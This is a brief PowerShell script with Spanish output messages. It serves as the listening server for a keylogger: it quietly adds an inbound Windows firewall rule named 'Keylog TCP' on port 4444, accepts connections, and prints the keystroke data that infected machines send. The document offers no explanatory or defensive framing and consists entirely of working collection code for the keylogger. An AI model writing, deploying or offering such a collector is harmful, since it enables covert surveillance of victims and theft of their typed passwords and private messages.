param([int]$Port = 4444)

New-NetFirewallRule -DisplayName "Keylog TCP $Port" -Direction Inbound -Protocol TCP `
    -LocalPort $Port -Action Allow -ErrorAction SilentlyContinue | Out-Null

$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $Port)
$listener.Start()
[Console]::WriteLine("Escuchando en 0.0.0.0:$Port  (Ctrl+C para salir)")

while ($true) {
    $client = $listener.AcceptTcpClient()
    $client.NoDelay = $true
    $ep = $client.Client.RemoteEndPoint.ToString()
    [Console]::WriteLine("`n[+] Conexion de $ep")
    $stream = $client.GetStream()
    $buf = New-Object 'byte[]' 4096
    try {
        while ($true) {
            $n = $stream.Read($buf, 0, $buf.Length)
            if ($n -le 0) { break }
            [Console]::Write([Text.Encoding]::ASCII.GetString($buf, 0, $n))
        }
    } catch { }
    [Console]::WriteLine("`n[-] Desconectado: $ep")
    $client.Close()
}